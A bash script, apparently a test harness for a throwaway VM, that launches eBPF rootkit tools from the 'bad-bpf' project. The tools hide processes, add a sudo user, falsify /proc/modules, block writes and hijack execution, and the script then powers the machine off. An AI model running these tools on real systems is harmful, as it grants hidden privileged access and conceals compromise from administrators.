#!/bin/bash

touch /a
chmod +x /a

commands=(
    "./bad-bpf/src/bpfdos"
    "./bad-bpf/src/pidhide"
    "./bad-bpf/src/sudoadd -u fakeuser"
    "./bad-bpf/src/textreplace -f /proc/modules -i 'joydev' -r 'cryptd'"
    # "./bad-bpf/src/textreplace2 -f /proc/modules -i 'joydev' -r 'cryptd'"
    "./bad-bpf/src/writeblocker -p 1337"
    "./bad-bpf/src/exechijack"
)

for cmd in "${commands[@]}"; do
echo "Starting: $cmd"
    eval "$cmd" &
    sleep 1
    echo "----------------------------------------"
done

rm -f /a

echo "All programs finished."
poweroff
